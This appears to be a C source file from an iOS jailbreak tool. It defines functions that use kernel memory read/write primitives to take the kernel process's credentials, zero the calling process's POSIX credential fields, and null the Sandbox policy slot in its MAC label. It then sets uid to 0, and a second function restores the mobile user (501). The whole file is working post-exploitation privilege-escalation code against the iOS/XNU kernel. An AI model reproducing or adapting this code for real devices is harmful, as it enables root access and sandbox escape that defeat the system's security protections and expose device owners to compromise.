#include <mach/mach.h>

#include "common.h"
#include "kmem.h"
#include "kutils.h"

bool did_require_elevation = false;
uint8_t original_ucred_struct[12];

#ifdef __LP64__
#define LOG_KPTR(...) LOG("%s %llx", __VA_ARGS__)
#else
#define LOG_KPTR(...) LOG("%s %x", __VA_ARGS__)
#endif

kern_return_t elevate_to_root()
{
    kptr_t kernproc = find_proc(0);
    LOG_KPTR("got kern proc at", kernproc);

    kptr_t ourproc = find_proc(getpid());
    LOG_KPTR("got ourproc at", ourproc);

    kptr_t kern_ucred = rk64(kernproc + 0x100); // proc->p_ucred
    kptr_t our_ucred = rk64(ourproc + 0x100); // proc->p_ucred

    wk64(ourproc + 0x100, kern_ucred);

    // save ucred struct
    kread(our_ucred + 0x18, original_ucred_struct, 12); // ucred->cr_posix

    void* empty_buffer = calloc(12, 1);
    kwrite(our_ucred + 0x18, empty_buffer, 12);

    kptr_t label = rk64(our_ucred + 0x78);

    // wk64(label + 0x08, 0x0); // AMFI slot
    wk64(label + 0x10, 0x0); // Sandbox slot

    // if (getuid() != 0)
    // {

    setuid(0);

    did_require_elevation = true;
    // }

    wk64(ourproc + 0x100, our_ucred);

    LOG("our uid is now %d", getuid());

    return getuid() == 0 ? KERN_SUCCESS : KERN_FAILURE;
}

kern_return_t restore_to_mobile()
{
    if (!did_require_elevation || getuid() == 501) {
        return KERN_SUCCESS;
    }

    kptr_t ourproc = find_proc(getpid());
    LOG_KPTR("got ourproc at", ourproc);

    kptr_t our_ucred = rk64(ourproc + 0x100);

    kwrite(our_ucred + 0x18, original_ucred_struct, 12);

    setuid(501);

    LOG("our uid is now %d", getuid());

    return getuid() == 501 ? KERN_SUCCESS : KERN_FAILURE;
}
